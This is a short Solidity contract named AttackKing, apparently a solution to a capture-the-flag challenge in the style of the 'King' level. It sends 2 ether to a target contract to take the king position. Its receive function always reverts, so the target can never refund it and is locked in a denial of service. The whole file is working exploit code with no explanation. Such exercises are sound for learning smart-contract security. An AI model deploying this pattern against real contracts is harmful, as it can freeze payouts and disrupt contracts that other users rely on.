// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    address king;

    constructor(address king_) {
        king = king_;
    }

    function attack() public {
        (bool success,) = king.call{value: 2 ether}("");
        require(success, "attack failed");
    }

    receive() external payable {
        revert();
    }
}
